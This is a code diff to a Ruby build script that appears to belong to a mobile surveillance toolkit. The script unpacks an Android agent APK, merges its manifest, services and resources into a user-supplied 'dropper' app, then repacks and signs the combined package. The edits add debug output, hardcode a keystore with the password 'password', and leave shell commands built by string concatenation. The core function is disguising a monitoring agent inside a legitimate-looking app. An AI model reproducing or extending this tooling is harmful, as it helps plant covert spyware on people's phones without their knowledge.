@@ -25,10 +25,19 @@ def path (p)
 end
 
 class CrossPlatform
-	def self.exec(cmd, args)
+	def self.exec(cmd, args, add="")
 		system cmd + ' ' + args
 	end
 end
+
+# class Config
+#   def instance()
+#       return Config()
+#   end
+#   def temp(input)
+#     return input
+#   end
+# end
 
 def unpack
   trace :debug, "Build: apktool extract: #{@tmpdir}/apk"
@@ -39,13 +48,19 @@ def unpack
     version = d.scan(/core.android.(.*).apk/).flatten.first
 
     if version == "melt" then
+      trace :debug,  "-jar #{apktool} d -f #{d} -o #{@tmpdir}/apk.#{version}"
       #CrossPlatform.exec "java", "-jar #{apktool} if #{@tmpdir}/jelly.apk jelly"
       CrossPlatform.exec "java", "-jar #{apktool} d -f #{d} -o #{@tmpdir}/apk.#{version}"
     else
+      trace :debug,  "-jar #{apktool} d -f -s -r #{d} -o #{@tmpdir}/apk.#{version}"
       CrossPlatform.exec "java", "-jar #{apktool} d -f -s -r #{d} -o #{@tmpdir}/apk.#{version}"
     end
 
     ["rb.data", "cb.data"].each do |asset|
+      CrossPlatform.exec "pwd",""
+       exists =  File.exist?(path("apk.#{version}/assets/#{asset}"))
+       trace :debug, "check #{@tmpdir}/apk.#{version}/assets/#{asset} #{exists}" 
+
       raise "unpack failed. needed asset #{asset} not found" unless File.exist?(path("apk.#{version}/assets/#{asset}"))
     end
 
@@ -100,7 +115,8 @@ end
         silent()
       when :melted
         # user-provided file to melt with
-        melted(Config.instance.temp(params['input']))
+        #melted(RbConfig.instance.temp(params['input']))
+        melted(path(params['input']))
     end
 
     trace :debug, "Build: melt output is: #{@outputs.inspect}"
@@ -109,7 +125,7 @@ end
   end
 
   def sign(params)
-    trace :debug, "Build: signing with #{Config::CERT_DIR}/android.keystore"
+    trace :debug, "Build: signing with ~/Reversing/Android/cert/sandroid.keystore"
 
     apks = @outputs
     @outputs = []
@@ -121,9 +137,9 @@ end
       output = "#{@appname}.#{version}.apk"
       core = path(output)
 
-      raise "Cannot find keystore" unless File.exist? Config.instance.cert('android.keystore')
+      raise "Cannot find keystore" unless File.exist? 'certs/android.keystore'
 
-      CrossPlatform.exec "jarsigner", "-sigalg MD5withRSA -digestalg SHA1 -keystore #{Config.instance.cert('android.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{apk} ServiceCore"
+      CrossPlatform.exec "jarsigner", "-sigalg MD5withRSA -digestalg SHA1 -keystore #{'certs/android.keystore'} -storepass password -keypass password #{apk} ServiceCore"
 
       raise "jarsigner failed" unless File.exist? apk
 
@@ -208,28 +224,36 @@ end
     trace :debug, "Build: melted installer"
 
     apktool = path('apktool.jar')
+    trace :debug, "apktool: #{apktool}, input: #{input}, path: #{path('input')}"
 
     FileUtils.mv input, path('input')
     rcsdir = "#{@tmpdir}/apk.melt"
     pkgdir = "#{@tmpdir}/melt_input"
 
+    trace :debug, "rcsdir: #{rcsdir}, pkgdir: #{pkgdir}"
+
     # unpack the dropper application
-    CrossPlatform.exec "java", "-jar #{apktool} d #{path('input')} -o #{pkgdir}"
-    FileUtils.cp path('AndroidManifest.xml'), rcsdir
+    trace :debug, "java -jar #{apktool} d -f #{path('input')} -o #{pkgdir}"
+    CrossPlatform.exec "java", "-jar #{apktool} d -f #{path('input')} -o #{pkgdir}"
+    #FileUtils.cp path('AndroidManifest.xml'), rcsdir
 
     # load and mix the manifest and resources
     newmanifest = parse_manifest(rcsdir, pkgdir)
 
     # merge the directories
+    trace :debug, "merge"
     merge(rcsdir, pkgdir)
 
     # fix the xml headers
+    trace :debug, "patch_xml"
     patch_xml("#{rcsdir}/AndroidManifest.xml", newmanifest)
 
     # fix textAllCaps
+    trace :debug, "patch_resources"
     patch_resources(rcsdir)
 
     # repack the final application
+    trace :debug, "repack"
     apk = path("output.m.apk")
     CrossPlatform.exec "java", "-jar #{apktool} b #{rcsdir} -o #{apk}", {add_path: @tmpdir}
 
@@ -247,6 +271,7 @@ end
     #mix_manifest_application(xmlpkg, xmlrcs, "activity")
     mix_manifest_application(xmlpkg, xmlrcs, "service")
 
+    trace :debug, "producing output"
     return XmlSimple.xml_out(xmlpkg, {'KeepRoot' => true})
 
   rescue Exception => e
@@ -328,6 +353,7 @@ end
 def merge(rcsdir, pkgdir)
   FileUtils.rm "#{rcsdir}/res/layout/main.xml"
   FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"
+
 end
 
 def main(package)
@@ -337,9 +363,15 @@ def main(package)
 
 	print "package: " + package + "\n"
 
+	print "UNPACK\n"
 	unpack
-	melt ({"input"=>"package"})
+	print "MELT\n"
+  FileUtils.cp package, path(package)
+  FileUtils.cp 'zipalign', path('zipalign')
+	melt ({"input"=>package})
+	print "SIGN\n"
 	sign params
+	print "PACK\n"
 	pack params
 end
 
